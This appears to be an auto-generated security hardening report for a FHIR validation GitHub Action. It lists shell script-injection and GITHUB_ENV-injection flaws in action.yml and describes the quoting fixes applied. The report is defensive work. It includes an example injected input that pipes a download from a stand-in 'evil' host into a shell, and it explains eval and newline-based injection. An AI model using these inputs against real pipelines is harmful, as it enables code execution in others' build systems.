<!-- markdownlint-disable -->

# Hardening Report: FirelyTeam--firely-terminal-pipeline/v0.8.15

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **FirelyTeam--firely-terminal-pipeline/v0.8.15** was hardened automatically. 10 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b): inputs are expanded unquoted and used as commands. In many steps the boolean inputs are written as `if $INPUT_DOTNET_VALIDATION_ENABLED || $INPUT_TERMINOLOGY_SERVICE_BFARM_ENABLED; then`, `if $INPUT_SUSHI_ENABLED; then`, `if $INPUT_JAVA_VALIDATION_ENABLED; then`, `if $INPUT_JAVA_SNAPSHOT_ENABLED; then`, `if $CLOSE_SLICING_FOR_VALIDATION; then` and `if $INPUT_SUSHI_USE_CONFIG_DEPENDENCIES; then`. Bash runs the value of the input as a command, so an input such as `true; curl evil|sh` runs whatever the caller supplies. Affected steps: 'Check if .NET is installed', 'Check .NET SDK Version', 'Install Firely.Terminal', 'Check Firely Terminal Version', 'Simplifier login', 'Detect FHIR version', 'Validate FHIR version support', 'Set FHIR specification', the npm/SUSHI steps, 'Pre-processing', 'Configure validator engine', 'Run Quality Control checks', 'Report Success', 'Remove package cache', 'Check if Java is installed', 'Download Java Validator', both Java validate steps and 'Re-run SUSHI'. Fix: compare as strings, e.g. `if [[ "$INPUT_X" == "true" ]]`.

Locations:

- `action.yml:90`
- `action.yml:105`
- `action.yml:116`
- `action.yml:131`
- `action.yml:142`
- `action.yml:168`
- `action.yml:183`
- `action.yml:202`
- `action.yml:285`
- `action.yml:363`
- `action.yml:487`
- `action.yml:500`
- `action.yml:510`
- `action.yml:521`
- `action.yml:530`
- `action.yml:544`
- `action.yml:599`
- `action.yml:623`
- `action.yml:639`
- `action.yml:656`
- `action.yml:666`
- `action.yml:679`
- `action.yml:704`
- `action.yml:778`
- `action.yml:841`

### script-injection (severity: high)

Rule (b), step 'Install Firely.Terminal': the input is expanded unquoted: `dotnet tool install --global Firely.Terminal --version $FIRELY_TERMINAL_VERSION > /dev/null` (FIRELY_TERMINAL_VERSION comes from inputs.FIRELY_TERMINAL_VERSION).

Locations:

- `action.yml:119`

### script-injection (severity: high)

Rule (b), step 'Simplifier login': the inputs are expanded unquoted: `fhir login email=$INPUT_SIMPLIFIER_USERNAME password=$INPUT_SIMPLIFIER_PASSWORD`.

Locations:

- `action.yml:143`

### script-injection (severity: high)

Rule (b), step 'Install fsh-sushi': the input is expanded unquoted: `sudo npm install -g fsh-sushi@$SUSHI_VERSION` (SUSHI_VERSION comes from inputs.SUSHI_VERSION).

Locations:

- `action.yml:512`

### script-injection (severity: high)

Rule (b), steps 'Generate conformance resources with SUSHI' and 'Re-run SUSHI': the input is expanded unquoted: `sushi $INPUT_SUSHI_OPTIONS`. The line has no '# shellcheck disable=SC2086' comment and is not an array assignment, so the exemption does not apply.

Locations:

- `action.yml:531`
- `action.yml:843`

### script-injection (severity: high)

Rule (b), step 'Run Quality Control checks': the inputs are expanded unquoted: `if echo $INPUT_EXPECTED_FAILS | grep -w -q VALIDATION_CONFORMANCE_DOTNET; then`, `fhir check $INPUT_PATH_TO_QUALITY_CONTROL_RULES` and `fhir check --fail $INPUT_PATH_TO_QUALITY_CONTROL_RULES`.

Locations:

- `action.yml:625`

### script-injection (severity: high)

Rule (b), step 'Download Java Validator': `JAVA_VALIDATOR_DOWNLOAD_LOCATION=$(eval echo "$JAVA_VALIDATOR_DOWNLOAD_LOCATION")` passes the caller-supplied input inputs.JAVA_VALIDATOR_DOWNLOAD_LOCATION to eval. Any `$(...)`, `;` or backticks in the input are run as commands. The same step also has `wget -q $JAVA_VALIDATOR_DOWNLOAD_LOCATION -O validator_cli.jar` with the variable unquoted.

Locations:

- `action.yml:683`
- `action.yml:686`

### script-injection (severity: high)

Rule (b), step 'Validate all conformance resources in scope of the repository': inputs and env are expanded unquoted: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `if echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar $GITHUB_WORKSPACE/$p*.xml ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS $UNESCPAED_IG_DEPENDENCIES $LOCAL_IG_PARAMETERS`.

Locations:

- `action.yml:727`
- `action.yml:742`
- `action.yml:743`

### script-injection (severity: high)

Rule (b), step 'Validate all example resources in scope of the repository': inputs and env are expanded unquoted: `for p in $INPUT_PATH_TO_CONFORMANCE_RESOURCES;`, `for p in $PATH_TO_EXAMPLES;`, `if echo $INPUT_EXPECTED_FAILS | grep ...`, and `java -jar validator_cli.jar ... -version $FHIR_VERSION $INPUT_JAVA_VALIDATION_OPTIONS ...`.

Locations:

- `action.yml:795`
- `action.yml:800`
- `action.yml:810`

### github-env-injection (severity: high)

Step 'Detect FHIR version and determine dependency source' runs `echo "FHIR_VERSION=$fhirVersion" >> "$GITHUB_ENV"`. fhirVersion is not a literal: it is read from package.json or sushi-config.yaml in the repository (anyone who can change those files controls it) using jq/yq, and can be base64-decoded. It is not passed through `printf '%s' ... | tr -d '\n\r'` before the write, so a value with a newline could add extra environment variables for later steps.

Locations:

- `action.yml:271`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, github-env-injection

**Notes:**

Changes in action.yml:
- Boolean inputs: every `if $X` is now `if [[ "$X" == "true" ]]`, including the forms joined with || and &&.
- Single values are now double-quoted: the Firely Terminal version, the Simplifier login (`"email=..."` and `"password=..."`), `fsh-sushi@$SUSHI_VERSION`, `$USER`, the package cache path and the restore output. The optional QC rules path uses `${VAR:+"$VAR"}`.
- EXPECTED_FAILS is checked with `printf '%s\n' "$VAR" | grep -w -q` instead of an unquoted echo.
- List inputs (SUSHI_OPTIONS, JAVA_VALIDATION_OPTIONS, PATH_TO_CONFORMANCE_RESOURCES, PATH_TO_EXAMPLES): each is assigned to a bash array without quotes, with a `# shellcheck disable=SC2086` comment, and expanded as `"${arr[@]}"`. This splits and globs the same way upstream did.
- The IG dependency list (read from package.json) is split into an array the same way. The local and combined `-ig` options are now built as arrays (`-ig "$GITHUB_WORKSPACE/$p"`) instead of text strings.
- The validator file globs are now `"$GITHUB_WORKSPACE/$p"*.xml`, and FHIR_VERSION is quoted.
- Download Java Validator: removed the `eval echo`. The `$JAVA_VALIDATOR_VERSION` / `${JAVA_VALIDATOR_VERSION}` placeholder in the URL input is now replaced with the version as plain text using bash substitution, and wget gets the URL quoted. The default URL works as before. A custom URL that relied on other variables or command substitutions being expanded will no longer work, by design.
- github-env-injection: fhirVersion now goes through `printf '%s' | tr -d '\n\r'` before it is written to GITHUB_ENV.

Behaviour change: a boolean input set to an empty string used to count as true, because an empty command succeeds. It now counts as false. All of these inputs have defaults, so this only matters if a caller passes an empty value on purpose.

